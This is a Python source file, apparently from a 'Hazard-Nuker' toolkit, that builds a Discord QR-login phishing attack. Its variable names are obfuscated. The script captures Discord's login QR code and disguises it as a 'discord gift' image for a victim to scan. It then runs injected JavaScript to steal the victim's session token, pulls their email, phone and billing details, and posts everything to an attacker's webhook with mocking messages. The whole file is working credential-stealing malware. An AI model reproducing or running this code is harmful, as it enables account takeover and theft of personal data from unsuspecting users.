import os
import sys 
import json 
import base64 
import requests 
import PyInstaller .__main__ 
from PIL import Image 
from zipfile import ZipFile 
from time import sleep 
from urllib .request import urlretrieve 
from selenium import webdriver ,common 
from bs4 import BeautifulSoup 
from colorama import Fore 
from plugins .standard import getDriver ,getheaders ,SlowPrint 
def logo_qr ():
    O000O0O0OOO000000 =Image .open ('QR-Code/temp_qr_code.png','r')
    O0000OO0O00O0OOOO =Image .open ('QR-Code/overlay.png','r')
    O000O0O0OOO000000 .paste (O0000OO0O00O0OOOO ,(60 ,55 ),O0000OO0O00O0OOOO )
    O000O0O0OOO000000 .save ('QR-Code/Qr_Code.png',quality =95 )
def paste_template ():
    OOO0O0000O00O0O00 =Image .open ('QR-Code/template.png','r')
    OOO0O00O000OOOO00 =Image .open ('QR-Code/Qr_Code.png','r')
    OOO0O0000O00O0O00 .paste (OOO0O00O000OOOO00 ,(120 ,409 ))
    OOO0O0000O00O0O00 .save ('QR-Code/discord_gift.png',quality =95 )
def f1berqr (O00OO000OOO000O0O ):
    OO0OO0O00OOOOO0OO =getDriver ()
    if OO0OO0O00OOOOO0OO =="chromedriver.exe":
        O00O0O00OO00O00O0 =webdriver .ChromeOptions ()
        O00O0O00OO00O00O0 .add_experimental_option ('excludeSwitches',['enable-logging'])
        O00O0O00OO00O00O0 .add_experimental_option ("detach",True )
        try :
            OO00O0O0000OOOO0O =webdriver .Chrome (options =O00O0O00OO00O00O0 )
        except common .exceptions .SessionNotCreatedException as O0O00OO0O0O00O00O :
            print (O0O00OO0O0O00O00O .msg )
            sleep (2 )
            SlowPrint ("Enter anything to continue. . . ")
            input ()
    elif OO0OO0O00OOOOO0OO =="operadriver.exe":
        O00O0O00OO00O00O0 =webdriver .opera .options .ChromeOptions ()
        O00O0O00OO00O00O0 .add_experimental_option ('excludeSwitches',['enable-logging'])
        O00O0O00OO00O00O0 .add_experimental_option ("detach",True )
        try :
            OO00O0O0000OOOO0O =webdriver .Opera (options =O00O0O00OO00O00O0 )
        except common .exceptions .SessionNotCreatedException as O0O00OO0O0O00O00O :
            print (O0O00OO0O0O00O00O .msg )
            sleep (2 )
            SlowPrint ("Enter anything to continue. . . ")
            input ()
    elif OO0OO0O00OOOOO0OO =="msedgedriver.exe":
        O00O0O00OO00O00O0 =webdriver .EdgeOptions ()
        O00O0O00OO00O00O0 .add_experimental_option ('excludeSwitches',['enable-logging'])
        O00O0O00OO00O00O0 .add_experimental_option ("detach",True )
        try :
            OO00O0O0000OOOO0O =webdriver .Edge (options =O00O0O00OO00O00O0 )
        except common .exceptions .SessionNotCreatedException as O0O00OO0O0O00O00O :
            print (O0O00OO0O0O00O00O .msg )
            sleep (2 )
            SlowPrint (f"Enter anything to continue. . .")
            input ()
    else :
        print (f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to create a QR code with')
        sleep (3 )
        print ("Enter anything to continue. . . ",end ="")
        input ()
    OO00O0O0000OOOO0O .get ('https://discord.com/login')
    sleep (3 )
    O0OOOO0OO00O0O00O =OO00O0O0000OOOO0O .page_source 
    OO0OO0O000O0O000O =BeautifulSoup (O0OOOO0OO00O0O00O ,features ='html.parser')
    OOO0OO0O0OOO000O0 =OO0OO0O000O0O000O .find ('div',{'class':'qrCode-2R7t9S'})
    OO00O00O0O0O00000 =OOO0OO0O0OOO000O0 .find ('img')['src']
    OO00OO0O00O00OO00 =os .path .join (os .getcwd (),'QR-Code/temp_qr_code.png')
    OOO0000O000O00O00 =base64 .b64decode (OO00O00O0O0O00000 .replace ('data:image/png;base64,',''))
    print (f"\n{Fore.WHITE}Downloading templates for QR code")
    urlretrieve ("https://github.com/Rdimo/images/raw/master/Hazard-Nuker/QR-Code.zip",filename ="QR-Code.zip",)
    with ZipFile ("QR-Code.zip",'r')as OOO00O00O0O0000O0 :
        OOO00O00O0O0000O0 .extractall ()
    os .remove ("QR-Code.zip")
    with open (OO00OO0O00O00OO00 ,'wb')as OOO00O0OOOO0OO0O0 :
        OOO00O0OOOO0OO0O0 .write (OOO0000O000O00O00 )
    O00O000O00OOO0000 =OO00O0O0000OOOO0O .current_url 
    logo_qr ()
    paste_template ()
    os .remove (os .getcwd ()+"\\QR-Code\\overlay.png")
    os .remove (os .getcwd ()+"\\QR-Code\\template.png")
    os .remove (os .getcwd ()+"\\QR-Code\\temp_qr_code.png")
    print (f'\nQR Code generated in '+os .getcwd ()+"\\QR-Code")
    print (f'\n{Fore.RED}Make sure to have this window open to grab their token!{Fore.RESET}')
    print (f'\nIf you want to use more tools. Just open a new tab!\nFeel free to minimize this window{Fore.RESET}')
    print (f'{Fore.MAGENTA}Send the QR Code to a user and wait for them to scan!{Fore.RESET}')
    os .system (f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
    if sys .argv [0 ].endswith (".exe"):
        try :
            os .startfile (sys .argv [0 ])
        except Exception :
            pass 
    while True :
        if O00O000O00OOO0000 !=OO00O0O0000OOOO0O .current_url :
            OOOO000OO0OOOO000 =OO00O0O0000OOOO0O .execute_script ('''
    token = (webpackChunkdiscord_app.push([
        [''],
        {},
        e=>{m=[];for(
                let c in e.c)
                m.push(e.c[c])}
        ]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
    return token;
                ''')
            OOO00OOOOO0O0O000 =requests .get ("https://discord.com/api/v9/users/@me",headers =getheaders (OOOO000OO0OOOO000 )).json ()
            O0OOO00000O00O00O =""
            OOO0000O000OOOO0O =OOO00OOOOO0O0O000 ['flags']
            if (OOO0000O000OOOO0O ==1 ):O0OOO00000O00O00O +="Staff, "
            if (OOO0000O000OOOO0O ==2 ):O0OOO00000O00O00O +="Partner, "
            if (OOO0000O000OOOO0O ==4 ):O0OOO00000O00O00O +="Hypesquad Event, "
            if (OOO0000O000OOOO0O ==8 ):O0OOO00000O00O00O +="Green Bughunter, "
            if (OOO0000O000OOOO0O ==64 ):O0OOO00000O00O00O +="Hypesquad Bravery, "
            if (OOO0000O000OOOO0O ==128 ):O0OOO00000O00O00O +="HypeSquad Brillance, "
            if (OOO0000O000OOOO0O ==256 ):O0OOO00000O00O00O +="HypeSquad Balance, "
            if (OOO0000O000OOOO0O ==512 ):O0OOO00000O00O00O +="Early Supporter, "
            if (OOO0000O000OOOO0O ==16384 ):O0OOO00000O00O00O +="Gold BugHunter, "
            if (OOO0000O000OOOO0O ==131072 ):O0OOO00000O00O00O +="Verified Bot Developer, "
            if (O0OOO00000O00O00O ==""):O0OOO00000O00O00O ="None"
            O0O00O0OOO0OOO0O0 =OOO00OOOOO0O0O000 ["username"]+"#"+str (OOO00OOOOO0O0O000 ["discriminator"])
            OO0OO000O00OO0O00 =OOO00OOOOO0O0O000 ["email"]
            O0000000OO00O0O00 =OOO00OOOOO0O0O000 ["phone"]if OOO00OOOOO0O0O000 ["phone"]else "No Phone Number attached"
            OOOO0OO00O0000000 =f'https://cdn.discordapp.com/avatars/{OOO00OOOOO0O0O000["id"]}/{OOO00OOOOO0O0O000["avatar"]}.gif'
            try :
                requests .get (OOOO0OO00O0000000 )
            except :
                OOOO0OO00O0000000 =OOOO0OO00O0000000 [:-4 ]
            O0O0OO0OOO0O0OOO0 =requests .get ('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers =getheaders (OOOO000OO0OOOO000 )).json ()
            OOOO0OO00000OOO0O =False 
            OOOO0OO00000OOO0O =bool (len (O0O0OO0OOO0O0OOO0 )>0 )
            OOOOOOO00000OO00O =bool (len (json .loads (requests .get ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =getheaders (OOOO000OO0OOOO000 )).text ))>0 )
            OO00O0O0OOO0000O0 ={"avatar_url":"https://cdn.discordapp.com/attachments/916450381943439413/980123111527690251/ezgif.com-gif-maker_4.gif","embeds":[{"author":{"name":"F1ber QR Grabber","icon_url":"https://cdn.discordapp.com/attachments/916450381943439413/980123017436872714/ezgif.com-gif-maker_3.gif"},"description":f"**{O0O00O0OOO0OOO0O0}** is stupid\n\n**Has Billing:** {OOOOOOO00000OO00O}\n**Nitro:** {OOOO0OO00000OOO0O}\n**Badges:** {O0OOO00000O00O00O}\n**Email:** {OO0OO000O00OO0O00}\n**Phone:** {O0000000OO00O0O00}\n**[Avatar]({OOOO0OO00O0000000})**","fields":[{"name":"**Token**","value":f"```fix\n{OOOO000OO0OOOO000}```","inline":False }],"color":15548997 ,"footer":{"text":"Mmmh this person is really dumb"}}]}
            requests .post (O00OO000OOO000O0O ,json =OO00O0O0OOO0000O0 )
            break 
    os ._exit (0 )